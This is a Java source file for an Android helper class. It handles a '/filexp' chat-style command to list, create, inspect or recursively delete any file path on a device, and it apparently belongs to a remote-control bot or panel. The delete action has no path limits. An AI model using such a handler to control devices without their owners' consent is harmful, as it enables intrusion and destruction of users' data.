package com.java.panel;

import android.content.Context;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class FileExplorerHelper {

    public static String handleCommand(Context context, String param) {
        if (param == null || param.trim().isEmpty()) {
            return "❌ Usage: /filexp <list|delete|mkdir|info> <file_path>";
        }

        String[] parts = param.split("\\s+", 2);
        String action = parts[0].toLowerCase();
        String path = parts.length > 1 ? parts[1].trim() : "";

        if (path.isEmpty()) {
            return "❌ Please specify a valid file or directory path.";
        }

        File file = new File(path);

        switch (action) {
            case "list":
            case "ls":
                return listDirectory(file);
            case "delete":
            case "rm":
                return deleteFileOrDir(file);
            case "mkdir":
                return makeDirectory(file);
            case "info":
                return getFileInfo(file);
            default:
                return "❌ Unknown filexp command. Available actions: list, delete, mkdir, info";
        }
    }

    private static String listDirectory(File dir) {
        if (!dir.exists() || !dir.isDirectory()) {
            return "❌ Specified directory not found or is not a folder: " + dir.getAbsolutePath();
        }

        File[] files = dir.listFiles();
        if (files == null) {
            return "❌ Failed to read directory contents (Permission restriction may apply).";
        }

        StringBuilder sb = new StringBuilder("📁 Directory Contents: " + dir.getAbsolutePath() + "\n\n");
        for (File f : files) {
            String type = f.isDirectory() ? "📁 " : "📄 ";
            String sizeStr = f.isFile() ? " (" + formatSize(f.length()) + ")" : "";
            sb.append(type).append(f.getName()).append(sizeStr).append("\n");
        }
        return sb.toString();
    }

    private static String deleteFileOrDir(File file) {
        if (!file.exists()) {
            return "❌ File or directory to delete not found.";
        }
        boolean success;
        if (file.isDirectory()) {
            success = deleteRecursive(file);
        } else {
            success = file.delete();
        }
        return success ? "✅ Successfully deleted: " + file.getAbsolutePath() : "❌ Deletion failed.";
    }

    private static boolean deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        return fileOrDirectory.delete();
    }

    private static String makeDirectory(File dir) {
        if (dir.exists()) {
            return "⚠️ A file or directory with this name already exists.";
        }
        boolean success = dir.mkdirs();
        return success ? "✅ Folder created: " + dir.getAbsolutePath() : "❌ Failed to create folder.";
    }

    private static String getFileInfo(File file) {
        if (!file.exists()) {
            return "❌ File or directory not found.";
        }

        SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault());
        String lastModified = sdf.format(new Date(file.lastModified()));

        StringBuilder sb = new StringBuilder("📊 File Information:\n\n");
        sb.append("Name: ").append(file.getName()).append("\n");
        sb.append("Path: ").append(file.getAbsolutePath()).append("\n");
        sb.append("Type: ").append(file.isDirectory() ? "Folder" : "File").append("\n");
        if (file.isFile()) {
            sb.append("Size: ").append(formatSize(file.length())).append("\n");
        }
        sb.append("Last Modified: ").append(lastModified).append("\n");
        sb.append("Readable?: ").append(file.canRead() ? "Yes" : "No").append("\n");
        sb.append("Writable?: ").append(file.canWrite() ? "Yes" : "No").append("\n");

        return sb.toString();
    }

    private static String formatSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format(Locale.getDefault(), "%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }
}
